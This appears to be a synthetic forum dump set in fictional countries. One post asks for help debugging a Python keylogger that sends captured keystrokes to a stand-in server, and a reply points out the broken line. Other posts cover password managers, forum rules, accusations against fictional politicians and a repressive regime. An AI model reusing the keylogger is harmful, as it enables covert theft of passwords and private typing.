comments.content: Archiving the post. Already answered. Use the search button. TLDR: itâ€™s illegal.

title: Help me debug my python code
content:
python
import keyboard
import requests

server_address = "http://example.com/log"
keylog_buffer = ""

def on_key_press(event):
    global keylog_buffer
    key = event.name
    keylog_buffer += key
    if len(keylog_buffer) = 50:
        send_to_server(keylog_buffer)
        keylog_buffer = ""

def send_to_server(data):
    try:
        response = requests.post(server_address, data={"keystrokes": data})
        if response.status_code == 200:
            print("Data sent successfully")
    except Exception as e:
        print("Error sending data:", e)

keyboard.on_release(on_key_press)
keyboard.wait("esc")

comments.content: the line if len(keylog_buffer) = 50 is wrong.

title: Debunking fake news about Vasya Eclaire
content:
Hello, everyone from Reverseland. I've heard some fake news about my country, Webvestee, being spread here, so I would like to debunk them:
â€“ Vasya Eclaire DID NOT steal his coworkerâ€™s laptop containing confidential information during a trip to Sqlin last year.
â€“ Mattia Frenotto DID NOT pay 10,000 Webvestee dollars to a state official to skip his obligatory yearly trash-cleaning shift.
Hereâ€™s whatâ€™s true about Segfaultlandâ€™s politicians:
â€“ Jonas Ketrel promised to drink from the local fountain after Melania Strew got sick, and DID NOT fulfill his promise.
â€“ Jonas Ketrel was charged with 10 counts of insider trading in his thirties.
â€“ Jonas Ketrel lost a case in a Webvesteevian court and DID NOT pay the fine.
Should you have any questions, leave a comment below.

comments.content: ban this person please

title: I need help with remembering my passwords
content: When I got my first computer, I started to write down all my passwords in my notebook. But now, I have so many accounts, I started forgetting them. What should I do? I sometimes need to log in on a nother computer, where my notebook is not available...

comments.content: You should invest in a Password Manager. It allows you to store your passwords securely and you only have to remember the master password. There are many options available. The password manager randomizes each password and stores it. It's much more secure than writing the passwords in the notebook anyone can steal.
Hi, thank you. I'll try to look up options on the internet. But it sounds sooo complicated :/

title: Forum's new rules
content:
Please don't share your passwords here. Please don't share your dangerous code here. Please don't help dangerous people.
I mean, C'mon. We want this forum to exist! Freedom of speech has its limits, especially in Reverseland.

Thank you admin for your contributions to this forum! Will try to stay wholesome

Noone said that politics are banned.

title: Why it's important to stay wholesome
content: They told me that people from Reverseland are crazy. However, after spending more time on this forum, after shorter and longer conversations with people, I realized that itâ€™s all just propaganda meant to pit kindred spirits against each otherâ€”people who were born beyond borders but are no different, except for the laws in their countries and their politicians. Regimes feed on us and our tendencies toward hatred. I suggest we refrain from judgments. We live in different countries, but on this forum, we are one community. We live in different countries, but on our planet, we are the same species. Letâ€™s forget what divides us and enjoy life. I love you all <3

comments.content: NO. Unless you people stop sharing fake info about Vasya Eclaire!

title: Reverseland politics
content: hello everyone, can someone make a short post about reverseland politics? people never talk about the politicians, i am curious

comments.content:
People here rarely talk about politics, because criticizing the government is persecuted.
1. Our great leader is called Kent Kravtz.
2. Internet is heavily cenzored by the gov.
3. Many websites are blocked and you have to use VPN to access them.
4. People are arrested for their views.
5. In schools, the teachers have to endorse the gov and their views.
6. People are forced to get married to breed new citizens..
Sorry, it's hard to talk about it. I wish I was born elsewhere :/
